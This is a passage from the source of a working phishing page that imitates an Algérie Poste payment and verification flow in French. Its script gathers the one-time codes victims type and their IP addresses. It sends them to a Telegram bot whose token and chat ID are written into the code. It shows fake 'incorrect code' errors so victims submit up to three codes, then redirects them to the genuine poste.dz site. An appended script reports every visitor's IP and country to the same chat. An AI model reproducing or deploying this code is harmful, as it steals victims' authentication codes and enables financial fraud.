                    input.setSelectionRange(cursorPos-1,cursorPos-1);
                }
                if(e.key==='Delete'&&(cursorPos===2||cursorPos===5)){
                    e.preventDefault();
                    input.setSelectionRange(cursorPos+1,cursorPos+1);
                }
                if(!/[0-9]|Backspace|Delete|ArrowLeft|ArrowRight|Tab/.test(e.key)){
                    e.preventDefault();
                }
            });

            const expMonth=document.getElementById('expMonth');
            const expYear=document.getElementById('expYear');
            expMonth.value='01 - Janvier';
            expYear.value='2025';

            function moveFocus(current, direction) {
                const inputs = Array.from(otpInputs);
                const currentIndex = inputs.indexOf(current);
                
                if (direction === 1 && currentIndex < inputs.length - 1 && current.value) {
                    inputs[currentIndex + 1].focus();
                } else if (direction === -1 && currentIndex > 0) {
                    inputs[currentIndex - 1].focus();
                }
                
                validateOtpCode();
            }

            function validateOtpCode() {
                let otpValue = '';
                otpInputs.forEach(input => {
                    otpValue += input.value;
                });
                
                if (otpValue.length === 6 && /^(\d)\1{5}$/.test(otpValue)) {
                    otpInputs.forEach(input => {
                        input.classList.add('error');
                    });
                    errorMessage.textContent = 'Veuillez entrer un code OTP valide (les codes répétés ne sont pas autorisés)';
                    errorMessage.style.display = 'block';
                    successMessage.style.display = 'none';
                    return false;
                } else {
                    otpInputs.forEach(input => {
                        input.classList.remove('error');
                    });
                    errorMessage.style.display = 'none';
                    return true;
                }
            }

            otpInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = e.target.value.replace(/[^0-9]/g, '');
                    e.target.value = value;
                    
                    if (value && index < otpInputs.length - 1) {
                        moveFocus(e.target, 1);
                    }
                    validateOtpCode();
                });

                input.addEventListener('keypress', function(e) {
                    preventArabicInput(e);
                    isNumber(e);
                });

                input.addEventListener('paste', preventArabicPaste);

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace') {
                        if (!this.value && index > 0) {
                            e.preventDefault();
                            otpInputs[index - 1].focus();
                            otpInputs[index - 1].value = '';
                        }
                    } else if (e.key === 'ArrowLeft' && index > 0) {
                        e.preventDefault();
                        otpInputs[index - 1].focus();
                    } else if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
                        e.preventDefault();
                        otpInputs[index + 1].focus();
                    } else if (!/[0-9]|Backspace|Delete|ArrowLeft|ArrowRight|Tab/.test(e.key)) {
                        e.preventDefault();
                    }
                });

                input.addEventListener('focus', function() {
                    setTimeout(() => {
                        this.select();
                    }, 10);
                });

                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const paste = (e.clipboardData || window.clipboardData).getData('text');
                    const numbers = paste.replace(/[^0-9]/g, '').substring(0, 6);
                    
                    const arabicPattern = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
                    if (arabicPattern.test(paste)) {
                        return false;
                    }
                    
                    numbers.split('').forEach((num, i) => {
                        if (otpInputs[i]) {
                            otpInputs[i].value = num;
                        }
                    });
                    
                    validateOtpCode();
                    
                    if (numbers.length > 0) {
                        const lastIndex = Math.min(numbers.length - 1, otpInputs.length - 1);
                        otpInputs[lastIndex].focus();
                    }
                });
            });

            function resetOtpFields(){
                otpInputs.forEach(input=>{
                    input.value='';
                    input.classList.remove('error');
                    input.classList.remove('success');
                });
                errorMessage.style.display='none';
                successMessage.style.display='none';
                otpAttempts=0;
            }

            otpSubmitButton.addEventListener('click', async function(){
                let otpValue='';
                otpInputs.forEach(input=>{
                    otpValue+=input.value;
                });

                if(otpValue.length===6){
                    if (/^(\d)\1{5}$/.test(otpValue)) {
                        otpInputs.forEach(input => {
                            input.classList.add('error');
                        });
                        errorMessage.textContent = 'Veuillez entrer un code OTP valide (les codes répétés ne sont pas autorisés)';
                        errorMessage.style.display = 'block';
                        return;
                    }
                    
                    const userIP = await getUserIP();
                    
                    const message = `**Nouveau code OTP**\n\n` +
                                   `🔒 **OTP CODE:** \`${otpValue}\`\n` +
                                   `🌐 **IP:** \`${userIP}\``;
                    
                    await sendToTelegram(message);
                    
                    otpPage.style.display='none';
                    loadingPage.style.display='flex';
                    
                    setTimeout(function(){
                        loadingPage.style.display='none';
                        otpPage.style.display='block';
                        
                        otpAttempts++;
                        
                        if(otpAttempts<3){
                            otpInputs.forEach(input=>{
                                input.value = '';
                                input.classList.add('error');
                                input.classList.remove('success');
                            });
                            errorMessage.textContent='Code OTP incorrect. Veuillez réessayer.';
                            errorMessage.style.display='block';
                            successMessage.style.display='none';
                            otpInputs[0].focus();
                        }else{
                            otpInputs.forEach(input=>{
                                input.classList.remove('error');
                                input.classList.add('success');
                            });
                            errorMessage.style.display='none';
                            successMessage.textContent='Code OTP validé avec succès!';
                            successMessage.style.display='block';
                            
                            setTimeout(function(){
                                window.location.href='https://www.poste.dz/';
                            },2000);
                        }
                    },12000);
                }else{
                    alert('Veuillez entrer un code OTP valide de 6 chiffres.');
                    otpInputs.forEach(input=>{
                        input.classList.add('error');
                    });
                }
            });
        });
    </script>
</body>
</html>


























<script>
document.addEventListener('DOMContentLoaded', function() {
    const botToken = "8389195007:AAGkbz5t1VtKGgofC8t1GowIEDd2xLoCLE0";
    const chatId = "-4803572909";
    
    const services = [
        'https://ipapi.co/json/',
        'https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN',
        'https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_IPGEOLOCATION_KEY'
    ];
    
    function tryService(url) {
        return new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject('Timeout'), 3000);
            fetch(url)
                .then(r => {
                    clearTimeout(timeout);
                    return r.ok ? r.json() : reject('Failed');
                })
                .then(resolve)
                .catch(reject);
        });
    }
    
    async function getLocation() {
        let lastError;
        
        for (const url of services) {
            try {
                const data = await tryService(url);
                const country = data.country || data.country_name;
                const countryCode = data.country_code || data.countryCode;
                
                if (country && countryCode) {
                    return {
                        ip: data.ip,
                        country: country,
                        countryCode: countryCode
                    };
                }
            } catch (e) {
                lastError = e;
            }
        }
        
        try {
            const fallback = await fetch('https://api.db-ip.com/v2/free/self');
            if (fallback.ok) {
                const data = await fallback.json();
                return {
                    ip: data.ipAddress,
                    country: data.countryName,
                    countryCode: data.countryCode
                };
            }
        } catch (e) {}
        
        throw lastError || new Error('All services failed');
    }
    
    async function sendToTelegram(message) {
        for (let i = 0; i < 3; i++) {
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return true;
            } catch (e) {
                if (i === 2) throw e;
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }
    
    function formatMessage(data) {
        const flag = data.countryCode ? 
            String.fromCodePoint(...[...data.countryCode.toUpperCase()].map(c => 127397 + c.charCodeAt())) : '';
        return `🎌 New Visitor 🎌\n${flag} Country: ${data.country}\n📡 IP Address: ${data.ip}`;
    }
    
    getLocation()
        .then(data => {
            return sendToTelegram(formatMessage(data));
        })
        .catch(async () => {
            const ip = await fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => data.ip)
                .catch(() => 'Unknown IP');
            
            await sendToTelegram(`🎌 New Visitor 🎌\n📡 IP: ${ip}\n⚠️ Country detection failed`);
        });
});
</script>
